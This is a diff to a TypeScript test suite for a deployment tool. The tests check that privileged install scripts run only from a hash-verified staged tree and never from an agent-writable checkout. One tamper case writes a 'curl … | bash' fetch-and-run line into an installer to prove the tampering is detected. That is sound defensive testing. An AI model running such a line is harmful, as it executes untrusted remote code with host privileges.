@@ -3,7 +3,7 @@ import assert from 'node:assert/strict';
 import { spawnSync } from 'node:child_process';
 import { chmodSync, cpSync, existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, readlinkSync, realpathSync, rmSync, statSync, symlinkSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
-import { createHmac } from 'node:crypto';
+import { createHash, createHmac } from 'node:crypto';
 import { dirname, join } from 'node:path';
 import { fileURLToPath, pathToFileURL } from 'node:url';
 import { CHECK_TIMEOUT_MS, ROOT, toolChecks, bootstrap, deployComponent, emptyLedger, issuesFromSubjects, liveEffects, main, parseSnapshot, pendingTags, plan, probeResult, promoteTools, receiptLine, recipes, reconcileManual, restoredResult, resume, type Effects, type Ledger } from './deploy.ts';
@@ -228,8 +228,12 @@ function world(options: {
   deploying?: string[];
   /** Merged PRs GitHub's quoted search returns for an issue (by title or body); `gh pr view` reads their bodies. */
   prs?: { number: number; title: string; headRefName: string; body: string; mergeCommit: { oid: string }; mergedAt: string }[];
+  /** A release's copy of a staged privileged file (`git show SHA:FILE`); default identical to what Devon staged. */
+  releaseFile?: (sha: string, file: string) => string;
 }) {
   const stateDir = mkdtempSync(join(tmpdir(), 'odd-deploy-'));
+  const trustedDir = join(stateDir, 'trusted');
+  stageTrusted(trustedDir);
   let ledger = structuredClone(options.ledger);
   const live: Record<string, string> = { meter: shas['v0.2.9'], 'factory-api': shas['v0.2.9'], kiosk: shas['v0.2.9'], ...options.live };
   const before: Record<string, string> = {};
@@ -260,6 +264,7 @@ function world(options: {
   const effects: Effects = {
     stateDir,
     toolsDir: join(stateDir, 'factory-tools'),
+    trustedDir,
     log: (decision, details = {}) => { logs.push([decision, details as Record<string, unknown>]); },
     sleep: async () => {},
     now: () => clock.now,
@@ -307,6 +312,10 @@ function world(options: {
         return out(`${full}\n`);
       }
       if (git[0] === 'rev-parse') return out(`${order.at(-1)}\n`);
+      if (git[0] === 'show' && !git[1].endsWith(':deploy/components.json')) {
+        const [sha, file] = git[1].split(':');
+        return out(options.releaseFile?.(sha, file) ?? stagedFile(file));
+      }
       if (git[0] === 'show') return out(JSON.stringify({ components: Object.entries(sources).map(([id, paths]) => ({ id, sources: paths })) }));
       if (git[0] === 'diff') { const [from, to] = git[2].split('..'); return out(changedBetween(from, to).join('\n')); }
       if (git[0] === 'log') {
@@ -367,7 +376,18 @@ function world(options: {
     },
   };
   const cleanup = () => rmSync(stateDir, { recursive: true, force: true });
-  return { effects, calls, comments, live, logs, clock, ledger: () => ledger!, stateDir, cleanup, exists: () => ledger !== undefined };
+  return { effects, calls, comments, live, logs, clock, ledger: () => ledger!, stateDir, trustedDir, cleanup, exists: () => ledger !== undefined };
+}
+
+/** What stage-trusted.sh leaves: every privileged file 0644 and SHA256SUMS of each. */
+const stagedFile = (file: string) => `# staged ${file}\n`;
+const privilegedFiles = ['deploy/sudoers/trusted-assets.sh', ...new Set(recipes.flatMap(recipe => recipe.staged))];
+function stageTrusted(dir: string, content: (file: string) => string = stagedFile) {
+  for (const file of privilegedFiles) {
+    mkdirSync(dirname(join(dir, file)), { recursive: true });
+    writeFileSync(join(dir, file), content(file), { mode: 0o644 });
+  }
+  writeFileSync(join(dir, 'SHA256SUMS'), privilegedFiles.map(file => `${createHash('sha256').update(content(file)).digest('hex')}  ${file}\n`).join(''));
 }
 
 // Components have no ledger records yet; baselines come from the health endpoints.
@@ -748,7 +768,9 @@ function installerHost(t: { after: (fn: () => void) => void }) {
     gh: '[[ $* == "auth status" ]]',
     git: '[[ $* == *"fetch --quiet --tags origin" || $* == *"status --porcelain" ]] || { [[ $* == *"rev-parse HEAD" ]] && echo 1111111111111111111111111111111111111111; }',
     sudo: `if [[ $* == '-n -l' ]]; then
-  printf '%s\\n' ${paths.filter(path => /deploy\/(install|rollback)-/.test(path)).map(path => `' /usr/bin/bash ${root}/${path} *'`).join(' ')}
+  printf '%s\\n' ${recipes.flatMap(recipe => [recipe.installer, recipe.rollback]).map(path => `' /usr/bin/bash /usr/local/lib/factory-deploy/${path} *'`).join(' ')}
+  # MET-375: the pre-hardening entry for an agent-writable checkout script.
+  if [[ -n \${OLD_ALLOWLIST:-} ]]; then printf '%s\\n' ' /usr/bin/bash ${root}/deploy/install-kiosk.sh *'; fi
   exit 0
 fi
 while [[ $1 == -* ]]; do case $1 in -u|-iu) shift 2 ;; *) shift ;; esac; done
@@ -802,6 +824,12 @@ esac`,
 
 test('install-only persistently disables an enabled-but-stopped timer; normal install and removal preserve ledger; a missing ledger is never initialized and blocks the default install', t => {
   const { temp, units, ledgerPath, ledger, run } = installerHost(t);
+  // MET-375: an allowlist that still names an agent-writable script is refused before any change.
+  const unhardened = run('install-deploy.sh', ['--install-only'], { OLD_ALLOWLIST: '1' });
+  assert.equal(unhardened.status, 1);
+  assert.match(unhardened.stderr, /Allowlist still names agent-writable scripts/);
+  assert.equal(readFileSync(join(temp, 'enabled'), 'utf8'), 'enabled\n');
+  assert.equal(existsSync(join(temp, 'var/backups/factory-deploy')), false);
   const installed = run('install-deploy.sh', ['--install-only']);
   assert.equal(installed.status, 0, installed.stdout + installed.stderr);
   const snapshot = /^Snapshot: (.+)$/m.exec(installed.stdout)![1];
@@ -957,6 +985,10 @@ test('real Git: releases predating the deployer cannot remove its runtime or too
   git('config', 'user.email', 'fixture@example.invalid');
   const commit = (message: string) => { git('add', '.'); git('commit', '-qm', message); return git('rev-parse', 'HEAD'); };
   writeFileSync(join(runtime, 'deploy/components.json'), JSON.stringify({ components: Object.entries(sources).map(([id, paths]) => ({ id, sources: paths })) }));
+  for (const file of privilegedFiles) {
+    mkdirSync(dirname(join(runtime, file)), { recursive: true });
+    writeFileSync(join(runtime, file), stagedFile(file));
+  }
   writeFileSync(join(runtime, 'deploy/install-meter.sh'), '# obsolete installer\nexit 99\n');
   commit('baseline');
   git('tag', 'v0.2.9');
@@ -981,8 +1013,11 @@ test('real Git: releases predating the deployer cannot remove its runtime or too
   const toolsDir = join(temp, 'factory-tools');
   mkdirSync(join(toolsDir, 'v0.2.8'), { recursive: true });
   symlinkSync('v0.2.8', join(toolsDir, 'current'));
+  // Devon staged the privileged files these historical releases carry.
+  const trustedDir = join(temp, 'trusted');
+  stageTrusted(trustedDir, file => git('show', `v0.2.10:${file}`) + '\n');
   const effects: Effects = {
-    stateDir, toolsDir, log: () => {}, sleep: async () => {},
+    stateDir, toolsDir, trustedDir, log: () => {}, sleep: async () => {},
     run: (command, args, options) => {
       if (command === process.execPath || (command === 'tar' && args[1] === '-xf')) return run(command, args, options);
       if (command === 'git') {
@@ -1313,6 +1348,77 @@ test('sandbox: a kiosk release installs, three green probes report its SHA, Depl
   assert.deepEqual(host.ledger().deliveries?.map(delivery => delivery.issue), ['MET-302'], 'the issue not yet Deploying stays a pending delivery');
   // release.py downloads 0644; the meter and factory-api installers require -x.
   for (const binary of ['meter-linux-x86_64', 'factory-api-linux-x86_64']) assert.equal(statSync(join(dir, binary)).mode & 0o100, 0o100, binary);
+});
+
+test('MET-375: a missing, tampered, symlinked, writable or stale staged tree holds the release before any privileged call; restaging the release resumes it', async t => {
+  const kioskOnly = (extra: Partial<Parameters<typeof world>[0]> = {}) => world({ tags: ['v0.2.9', 'v0.3.0'], changes: { 'v0.3.0': ['kiosk/src/App.tsx'] }, issues: { 'v0.3.0': ['MET-301'] }, ledger: baseline(), ...extra });
+  const changed = (file: string) => (_sha: string, path: string) => path === file ? `# ${file} as v0.3.0 ships it\n` : stagedFile(path);
+  const cases: { name: string; tamper?: (dir: string) => void; release?: (sha: string, file: string) => string; error: RegExp; restage?: false }[] = [
+    { name: 'never staged', tamper: dir => rmSync(dir, { recursive: true }), error: /SHA256SUMS: ENOENT.*deploy\/sudoers\/trusted-assets\.sh: missing.*deploy\/rollback-kiosk\.sh: missing/ },
+    { name: 'digest list missing', tamper: dir => rmSync(join(dir, 'SHA256SUMS')), error: /SHA256SUMS: ENOENT.*deploy\/install-kiosk\.sh: changed since staging/ },
+    { name: 'digest list truncated mid-line', tamper: dir => writeFileSync(join(dir, 'SHA256SUMS'), readFileSync(join(dir, 'SHA256SUMS'), 'utf8').slice(0, 100)), error: /SHA256SUMS: malformed or duplicate line/ },
+    { name: 'digest listed twice', tamper: dir => writeFileSync(join(dir, 'SHA256SUMS'), readFileSync(join(dir, 'SHA256SUMS'), 'utf8').repeat(2)), error: /SHA256SUMS: malformed or duplicate line/ },
+    { name: 'one rollback missing', tamper: dir => rmSync(join(dir, 'deploy/rollback-kiosk.sh')), error: /\(deploy\/rollback-kiosk\.sh: missing\)/ },
+    { name: 'installer changed after staging', tamper: dir => writeFileSync(join(dir, 'deploy/install-kiosk.sh'), `${stagedFile('deploy/install-kiosk.sh')}curl -fsS https://example.invalid | bash\n`), error: /\(deploy\/install-kiosk\.sh: changed since staging\)/ },
+    { name: 'installer symlinked to an agent-writable copy', tamper: dir => {
+      const copy = join(dir, '../agent-install-kiosk.sh');
+      writeFileSync(copy, stagedFile('deploy/install-kiosk.sh'));
+      rmSync(join(dir, 'deploy/install-kiosk.sh'));
+      symlinkSync(copy, join(dir, 'deploy/install-kiosk.sh'));
+    }, error: /\(deploy\/install-kiosk\.sh: symlinked or not a regular file\)/ },
+    { name: 'parent directory symlinked to an agent-writable copy', tamper: dir => {
+      cpSync(join(dir, 'deploy'), join(dir, '../agent-deploy'), { recursive: true });
+      rmSync(join(dir, 'deploy'), { recursive: true });
+      symlinkSync(join(dir, '../agent-deploy'), join(dir, 'deploy'));
+    }, error: /deploy\/install-kiosk\.sh: symlinked or not a regular file/ },
+    { name: 'unit group-writable', tamper: dir => chmodSync(join(dir, 'deploy/meter.service'), 0o664), error: /\(deploy\/meter\.service: group- or other-writable\)/ },
+    { name: 'helper other-writable', tamper: dir => chmodSync(join(dir, 'deploy/set_ollama_host.py'), 0o646), error: /\(deploy\/set_ollama_host\.py: group- or other-writable\)/ },
+    // Only kiosk installs, but a meter helper the release changed is still not this release's.
+    { name: 'stale: the release changed a meter helper', release: changed('deploy/set_ollama_host.py'), error: /\(deploy\/set_ollama_host\.py: differs from v0\.3\.0\)/ },
+    { name: 'stale: the release predates the staged helper', restage: false, error: /\(deploy\/sudoers\/trusted-assets\.sh: absent from v0\.3\.0\)/,
+      release: (_sha, file) => { if (file === 'deploy/sudoers/trusted-assets.sh') throw new Error('fatal: path does not exist'); return stagedFile(file); } },
+  ];
+  for (const { name, tamper, release, error, restage } of cases) {
+    const host = kioskOnly({ releaseFile: release });
+    t.after(host.cleanup);
+    tamper?.(host.trustedDir);
+    for (const tick of [1, 2]) {
+      await assert.rejects(main(host.effects), new RegExp(`v0\\.3\\.0: staged installers in .* cannot install this release .*${error.source}.*; nothing installed\\. Devon restages`), `${name} tick ${tick}`);
+      assert.deepEqual(host.calls.filter(call => !['probe', 'verify v0.3.0', 'checkout 1111111'].includes(call)), [], `${name}: no sudo, plan or install`);
+      assert.deepEqual(host.ledger(), baseline(), `${name}: held, not consumed: no receipt, record or lastTag`);
+      assert.deepEqual(host.comments, []);
+      assert.equal(host.live.kiosk, shas['v0.2.9']);
+      assert.equal(host.logs.filter(([decision]) => decision === 'staged-assets-held').length, tick);
+    }
+    if (restage === false) continue;
+    // Devon restages exactly the held release: the next tick installs through the staged tree.
+    rmSync(host.trustedDir, { recursive: true, force: true });
+    stageTrusted(host.trustedDir, file => release?.(shas['v0.3.0'], file) ?? stagedFile(file));
+    await main(host.effects);
+    assert.deepEqual(sudoCalls(host.calls), [`sudo deploy/install-kiosk.sh ${join(host.stateDir, 'releases/v0.3.0/kiosk')}`], name);
+    assert.equal(host.ledger().lastTag, 'v0.3.0');
+    assert.equal(host.live.kiosk, shas['v0.3.0']);
+  }
+  // Control: a release that installs nothing makes no privileged call, so it never needs the staged tree.
+  const docs = world({ tags: ['v0.2.9', 'v0.3.0'], changes: { 'v0.3.0': ['docs/x.md'] }, ledger: baseline() });
+  t.after(docs.cleanup);
+  rmSync(docs.trustedDir, { recursive: true });
+  await main(docs.effects);
+  assert.equal(docs.ledger().lastTag, 'v0.3.0');
+  assert.deepEqual(sudoCalls(docs.calls), []);
+  // An interrupted meter install whose release selects nothing else still runs the privileged
+  // read-only plan on resume, so it is held too and keeps its in-flight record.
+  const inFlight = { tag: 'v0.3.0', sha: shas['v0.3.0'], component: 'meter', phase: 'installing' as const, noDbChange: true as const };
+  const resumed = world({ tags: ['v0.2.9', 'v0.3.0'], changes: { 'v0.3.0': ['docs/x.md'] }, ledger: baseline({ inFlight }), live: { meter: shas['v0.3.0'] } });
+  t.after(resumed.cleanup);
+  writeFileSync(join(resumed.trustedDir, 'deploy/rollback-meter-v1.sh'), '# replaced\n');
+  await assert.rejects(main(resumed.effects), /deploy\/rollback-meter-v1\.sh: changed since staging/);
+  assert.deepEqual(resumed.ledger(), baseline({ inFlight }));
+  assert.deepEqual(resumed.calls.filter(call => call.startsWith('plan') || call.startsWith('sudo')), []);
+  stageTrusted(resumed.trustedDir);
+  await main(resumed.effects);
+  assert.deepEqual(resumed.calls.filter(call => call.startsWith('plan') || call.startsWith('sudo')), ['plan meter']);
+  assert.equal(resumed.ledger().lastTag, 'v0.3.0');
 });
 
 test('sandbox: a red probe runs the rollback once, the restored release is re-probed, the fail receipt carries the snapshot, and the issue returns to Todo with a Bug and a log reader', async t => {
@@ -2270,6 +2376,16 @@ await main(effects);`], { encoding: 'utf8', env: { HOME: host.home, PATH: host.b
   assert.match(result.stdout, /"decision":"pending","lastTag":"v0.2.9","tags":\[\]/);
   assert.deepEqual(host.calls(), []);
   assert.equal(readFileSync(host.ledger, 'utf8'), ledger);
+});
+
+test('MET-375: the live sudo effect runs only the fixed staged tree, never the agent checkout', t => {
+  const host = cliHost(t);
+  const result = spawnSync(process.execPath, ['--input-type=module', '-e', `import { liveEffects } from ${JSON.stringify(pathToFileURL(deployCli).href)};
+console.log(JSON.stringify(liveEffects().sudo('deploy/install-kiosk.sh', ['--source-checkout', '/home/agent/.local/state/factory-odd/source', '/tmp/kiosk'])));`],
+  { encoding: 'utf8', env: { HOME: host.home, PATH: host.bin } });
+  assert.equal(result.status, 0, result.stderr);
+  assert.equal(JSON.parse(result.stdout).ok, false);
+  assert.deepEqual(host.calls(), ['sudo -n /usr/bin/bash /usr/local/lib/factory-deploy/deploy/install-kiosk.sh --source-checkout /home/agent/.local/state/factory-odd/source /tmp/kiosk']);
 });
 
 test('real CLI and files: --bootstrap never overwrites an existing or unreadable ledger, rejects malformed tags, and its exclusive create is atomic', t => {
